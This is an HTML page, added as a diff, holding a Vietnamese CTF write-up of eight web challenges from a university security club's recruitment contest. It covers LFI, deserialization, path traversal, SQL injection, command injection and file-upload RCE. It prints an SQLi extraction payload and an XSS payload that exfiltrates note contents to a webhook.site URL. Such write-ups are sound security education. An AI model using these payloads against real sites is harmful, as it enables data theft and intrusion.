@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="kcsc.css" media="screen">
+</head>
+<body>
+    <div class="container" >
+      <div class="main">  
+        <div class="header">
+              <h4 class="header-text1">@HackerGa2101</h4>
+              <img src="../../images/torii-gate.png" alt="gate" class="gate">
+              <h4 class="header-text2">CTF Write Up</h4>
+        </div>
+        <div class="content">
+             <div class="anh">
+                <img src="../../images/kcsc/2.png" alt="bksec" class="bksec">
+             </div>
+          <div class="baotext"> 
+             <div class="text", style="color: rgb(35, 34, 34);">
+                <h1 style="margin-left: 330px;">KCSC RECRUITMENT | KCSC CTF</h1>
+                <br>
+                <p>Trong tháng 12 cuối năm, mình đã tham ghi thi tuyển vào KCSC clb an toàn thông tin của trường mình </p>
+                <br>
+                <p>Nhìn chung thì đề KCSC hay, được phân bố từ dễ đến khó. Và mình áp vào mảng web nên sẽ tập trung solve web nhé</p>
+                <br>
+                <p>Trong giờ thi thì mình làm được 8/10 challeges web gồm: 4 ez, 2 medium, 2hard</p>
+             </div>
+             <div class="wu", style="color: rgb(35, 34, 34);">
+                <h4>Bài 1: Pokemon Hof Panel Level 1</h4>
+                  <div class="chutrong">
+                       <p>*Mục tiêu của bài là trở thành nhà vô địch pokemon</p>
+                       <div style="height: 3px;"></div>
+                       <p>Đây là chall khởi động đầu tiên nên cũng không khó khăn gì cả</p>
+                       <div style="height: 3px;"></div>
+                       <p>Mình nhận thấy sau mỗi lần đăng ký với tên người dùng và chọn 1 pokemon ta đều có 1 cookie mới</p>
+                       <div style="height: 3px;"></div>
+                       <img src="../../images/kcsc/pokemon/2.png" alt="1" style="width: 1100px;">
+                       <div style="height: 3px;"></div>
+                       <p>Xem cookie đó trong burp mình nhận thấy có 1 trường isChampion:0 (dữ liệu serialize) </p>
+                       <div style="height: 3px;"></div>
+                       <img src="../../images/kcsc/pokemon/4.png" alt="1" style="width: 1100px;">
+                       <div style="height: 3px;"></div>
+                       <p>Mình thử đổi trường đó, thử truy cập lại và thành công nhận được flag</p>
+                       <div style="height: 3px;"></div>
+                        <br>
+                        <!--  -->
+                        <!--  -->
+                            <h4>Bài 2: Mi Tom Thanh Long</h4>
+                              <div class="chutrong">
+                                   <p>*Mục tiêu của bài là RCE để đọc file ./pages/flag.php</p>
+                                   <div style="height: 3px;"></div>
+                                   <p>Khi dùng thử các features của web mình thấy đều có điểm chung là ?page=pages/$name.php</p>
+                                   <div style="height: 3px;"></div>
+                                   <p>Dự đoán author đã include các file theo dạng trên nên mình test lfi</p>
+                                   <div style="height: 3px;"></div>
+                                   <img src="../../images/kcsc/thanhlong/2.png" alt="1" style="width: 1100px;">
+                                   <div style="height: 3px;"></div>
+                                   <p>Thành công lấy được file /etc/passwd</p>
+                                   <br>
+                                    <p>Tiếp đến mình dùng wrapper php:filter để thử RCE và thành công tìm được file ./pages/flag.php</p>
+                                   <div style="height: 3px;"></div>
+                                   <div style="height: 3px;"></div>
+                                   <img src="../../images/kcsc/thanhlong/6.png" alt="1" style="width: 1100px;">
+                                   <div style="height: 3px;"></div>
+                                   <p>Nhưng không thể cat file vì sẽ bị render code nên mình chọn code curl file ra webhook</p>
+                                   <div style="height: 3px;"></div>
+                                   <img src="../../images/kcsc/thanhlong/8.png" alt="1" style="width: 1100px;">
+                                   <div style="height: 3px;"></div>
+                                   
+                                </div>
+                                <!--  -->
+                                <!--  -->
+                                  <h4>Bài 3: Apply To KCSC</h4>
+                                    <div class="chutrong">
+                                         <p>*Mục tiêu của bài là upload file to RCE</p>
+                                         <div style="height: 3px;"></div>
+                                         <p>Bài này đơn giản chỉ là upload file với mime type đầu là pdf là được</p>
+                                         <div style="height: 3px;"></div>
+                                         <p>Đầu vào là form đăng ký có cho phép tải lên file pdf nhưng không có filter gì cả nên mình cắt ngắn wu nhá :v</p>
+                                         <div style="height: 3px;"></div>
+                                         <img src="../../images/kcsc/applytokcsc/5.png" alt="1" style="width: 1100px;">
+                                       
+                                         <div style="height: 3px;"></div>
+                                         <img src="../../images/kcsc/applytokcsc/6.png" alt="1" style="width: 1100px;">
+                                         <div style="height: 3px;"></div>
+                                          <br>
+                                      </div>    
+                                                                <!--  -->
+                                <!--  -->
+                                <h4>Bài 4: WarmupPHP 01</h4>
+                                <div class="chutrong">
+                                     <p>*Mục tiêu của bài là đọc flag bằng smarty template</p>
+                                     <div style="height: 3px;"></div>
+                                     <p>Mình làm 1 vài phép thử và chứng minh web đang sử dụng smarty template và tìm được thông tin /?source trong robots.txt</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/01/3.png" alt="1" style="width: 1100px;">
+                                    <p>Sau khi xem source mình thấy $flag1 được define bằng 1 biến FLAG1 nên đã thử in biến đó ra xem</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/01/4.png" alt="1" style="width: 1100px;">
+                                     <div style="height: 3px;"></div>
+                                      <br>
+                                  </div> 
+                                  <!--  -->
+                                                                  <!--  -->
+                                <h4>Bài 5: save_the_world</h4>
+                                <div class="chutrong">
+                                     <p>*Mục tiêu của bài là path traversal đọc file chứa flag</p>
+                                     <div style="height: 3px;"></div>
+                                     <p>Giao diện đầu vào là upload file nên đánh lạc hướng nhiều ae chơi 1 lúc lâu</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/save_the_world/1.png" alt="1" style="width: 1100px;">
+                                    <p>Sau khi đọc chi tiết lại source mình thấy có 1 vài hạn chế và 1 số hàm đáng nghi sau</p>
+                                    <p>Allow extension là 'PNG, JPG, GIF' và cấm kí tự '..' trong path</p>
+                                    <p>Nhưng lại có 1 hàm unquote filepath trước khi truy cập</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/save_the_world/5.png" alt="1" style="width: 1100px;">
+                                     <div style="height: 3px;"></div>
+                                     <p>Chức năng chính của hàm này là decode url vậy nếu mình encode url 2 lần thì unquote ra vừa có nghĩa và vừa bypass được filter</p>
+                                     <p>Tiếp đó mình thấy flag được set thành biến môi trường trong file docker-compose.yml</p>
+                                     <p>Nên giờ thử xem file /proc/self/environ để lấy flag</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/save_the_world/8.png" alt="1" style="width: 1100px;">
+                                      <br>
+                                  </div> 
+                                  <!--  -->
+                                                                                                    <!--  -->
+                                <h4>Bài 6: Pokemon Hof Panel Level 2</h4>
+                                <div class="chutrong">
+                                     <p>*Mục tiêu của bài là serialize to write file to RCE</p>
+                                     <div style="height: 3px;"></div>
+                                     <p>Đây là bài khởi đầu của chuỗi bài căng thẳng hơn :v Mình cũng mất 1 khoảng thời gian để làm được</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/pokemon2/1.png" alt="1" style="width: 1100px;">
+                                    <p>Vẫn là giao diện đó giờ chỉ là file flag đang ở /flag.txt</p>
+                                    <p>Vì source không lớn nên không khó để detech được hàm bị lỗi có thể kiểm soát</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/pokemon2/2.png" alt="1" style="width: 1100px;">
+                                     <div style="height: 3px;"></div>
+                                     <p>Nếu serialize thì mình hoàn toàn kiểm soát biến error và logfile -> kiểm soát tính năng ghi log theo ý mình</p>
+                                     <p>Tiếp đó là nơi unserialize data </p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/pokemon2/4.png" alt="1" style="width: 1100px;">
+                                     <div style="height: 3px;"></div>
+                                     <p>sau khi unserialize data sẽ được check bởi hàm isChampion nên mình sẽ để payload vào trong class chứa hàm để tránh lỗi</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/pokemon2/3.png" alt="1" style="width: 1100px;">
+                                     <div style="height: 3px;"></div>
+                                     <p>Sau khi đã đủ thông tin thì tạo lại code để lấy serialize</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/pokemon2/6.png" alt="1" style="width: 1100px;">
+                                     <div style="height: 3px;"></div>
+                                     <p>Mình đọc dockerfile để biết document root là /var/www/html</p>
+                                     <p>Tiếp đó truy cập vào file a.php và thành công thực thi code php</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/pokemon2/9.png" alt="1" style="width: 1100px;">
+                                     <div style="height: 3px;"></div>
+                                     <p>Giờ sửa lại payload để lấy file flag thôi</p>
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/pokemon2/11.png" alt="1" style="width: 1100px;">
+                                     <div style="height: 3px;"></div>
+                                      <br>
+                                  </div> 
+                                  <!--  -->
+                                                              <!--  -->
+                                                              <h4>Bài 7: Kpop</h4>
+                                                              <div class="chutrong">
+                                                                   <p>*Mục tiêu của bài là SQLi to Cmdi</p>
+                                                                   <div style="height: 3px;"></div>
+                                                                   <p>Mình thấy đây là bài khó nhất trong tất cả chall mình solve được</p>
+                                                                   <div style="height: 3px;"></div>
+                                                                   <p>Mình đọc source thấy có 1 vài đoạn code lỗi cần lưu ý</p>
+                                                                   <p>Trong admin.php để user input (đã filter) lọt vào hàm system
+                                                                    .Và vì từng làm nên em biết hàm escapeshellcmd bypass được
+                                                                    .Nhưng để vào được admin.php thì $_SESSION[’name’] === ‘aespa’</p>
+                                                                   <div style="height: 3px;"></div>
+                                                                   <img src="../../images/kcsc/kpop/1.png" alt="1" style="width: 1100px;">
+                                                                 
+                                                                   <div style="height: 3px;"></div>
+                                                                   <p>Tiếp đó là SQLi ở biến logcode nếu mình tự truyền input thì logcode sẽ lấy giá trị của mình </p>
+                                                                   <img src="../../images/kcsc/kpop/4.png" alt="1" style="width: 1100px;">
+                                                                   <div style="height: 3px;"></div>
+                                                                   <p>Bắt lại 1 vài filter của bài</p>
+                                                                   <img src="../../images/kcsc/kpop/2.png" alt="1" style="width: 1100px;">
+                                                                   <div style="height: 3px;"></div>
+                                                                   <p>Từ dữ kiện trên mình dự đoán SQLi leak account admin để thực hiện Cmdi đọc flag</p>
+                                                                   <img src="../../images/kcsc/kpop/7.png" alt="1" style="width: 1100px;">
+                                                                   <div style="height: 3px;"></div>
+                                                                   <p>Giờ thì thực hiện SQLi. Trong history.php sẽ show ra logcode và username của account hiện tại. Đọc lại đoạn bị SQLi trên mình nghĩ tới việc để password aespa vào logcode của mình</p>
+                                                                   <p>Nhưng vấn đề là logcode là int nên mình nghĩ sẽ cắt từng chữ trong password chuyển về dạng octal và in ra màn hình (thật ra là nhét vào username sẽ hay hơn)</p>
+                                                                   <p>*PAYLOAD: (SELECT OCT(ASCII(SUBSTRING(password, 1,1))) AS octal_password FROM users WHERE id=5)</p>
+                                                                   <img src="../../images/kcsc/kpop/9.png" alt="1" style="width: 1100px;">
+                                                                   <div style="height: 3px;"></div>
+                                                                   <p>Tiếp đó mình code python để tự động lấy password (110 kí tự đấy :>>>)</p>
+                                                                   <p>Tiếp đó login vào và thực hiện Cmdi nhưng không thể injection mệnh đề khác vì eascapecmd chặn và từ flag bị cấm</p>
+                                                                   <img src="../../images/kcsc/kpop/10.png" alt="1" style="width: 1100px;">
+                                                                   <div style="height: 3px;"></div>
+                                                                   <p>Tìm đọc mạng để thấy cách bypass hàm trên</p>
+                                                                   <img src="../../images/kcsc/kpop/11.png" alt="1" style="width: 1100px;">
+                                                                   <div style="height: 3px;"></div>
+                                                                    <br>
+                                                                  
+                                                                </div>    
+                                                                                          <!--  -->
+                                                                                                                                                            <!--  -->
+                                <h4>Bài 8:  XmaS noteS</h4>
+                                <div class="chutrong">
+                                     <p>*Mục tiêu của bài là XSS to SSRF</p>
+                                     <div style="height: 3px;"></div>
+                                     <p>Web có tính năng là lưu note của người dùng và cho bot đến check note đó</p>
+                                     <div style="height: 3px;"></div>
+                                     <p>Vì từng làm bài tương tự trên HTB nên mình cũng có cách làm luôn :v</p>
+                                     <img src="../../images/kcsc/xmas/1.png" alt="1" style="width: 1100px;">
+                                    <p>Chứng minh XSS tại lưu note</p>
+                                    <p>Ý tưởng là sẽ tạo 1 note XSS (chức năng fetch đến /note/1 chứa flag rồi fetch data về webhook) bắt con bot tới check</p>
+                                     <div style="height: 3px;"></div>
+                                     <p>*PAYLOAD: IMG src=x onerror=fetch('/note/1').then(function(r){r.text().then(function(d){fetch('https://webhook.site/99d4d679-41d2-4eec-b185-acecfa39550c',{method:'POST',body:d})})})></p>
+                                     <img src="../../images/kcsc/xmas/6.png" alt="1" style="width: 1100px;">
+                                     <div style="height: 3px;"></div>
+                                     <img src="../../images/kcsc/xmas/7.png" alt="1" style="width: 1100px;">
+                                     <p>Đoạn này mình lười viết chứ bài này không dễ đâu nhá kaka</p>
+                                      <br>
+                                  </div> 
+                                  <!--  -->
+                                  <h4>Tổng quan là một cuộc thi ctf hay và sau vài ngày thì mình đã nhận được thư mời phỏng vấn còn đỗ không thì mai mới phỏng vấn xong mới biết. luckiii !</h4>
+                                  <img src="../../images/kcsc/xmas/pv.png" alt="1" style="width: 1100px;">
+                  </div>
+      </div>
+    </div>
+</body>
+</html>
